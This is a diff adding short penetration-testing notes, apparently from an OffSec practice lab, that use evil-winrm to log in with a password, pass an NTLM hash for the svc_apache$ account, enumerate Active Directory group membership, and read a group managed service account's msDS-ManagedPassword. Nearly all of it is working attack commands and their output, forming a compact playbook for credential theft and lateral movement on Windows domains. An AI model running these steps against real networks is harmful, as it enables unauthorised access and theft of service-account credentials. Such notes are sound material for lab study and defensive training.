@@ -1,2 +1,30 @@
+#!/usr/bin/peno
+
+#log in directly into a WinRM session
 ./evil-winrm.rb -i 192.168.50.80 -u offensive -p security
+
+
+#pass the hash
+evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
+
+#Post Enumeration
+*Evil-WinRM* PS C:\Users\enox\Desktop> Import-Module ActiveDirectory
+*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADPrincipalGroupMembership svc_apache$ | select name
+Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADPrincipalGroupMembership enox | select name
+
+
+#Group Managed Service Accounts provide a higher security option for non-interactive applications, services, processes, or tasks that run automatically but need a security credential.
+# To see what users or groups have permissions to do that for a given service account, we can look up the PrincipalsAllowedToRetrieveManagedPassword user property on the account
+*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
+PrincipalsAllowedToRetrieveManagedPassword
+------------------------------------------
+{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
+
+#It looks like the group Web Admins (i.e. the group we are in) has such privilege over the svc_apache$ account. Let's see if we can indeed retrieve the password hash.
+*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+*Evil-WinRM* PS C:\Users\enox\Desktop> $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+*Evil-WinRM* PS C:\Users\enox\Desktop> $mp = $gmsa.'msDS-ManagedPassword'
+*Evil-WinRM* PS C:\Users\enox\Desktop> $mp
+
+
 
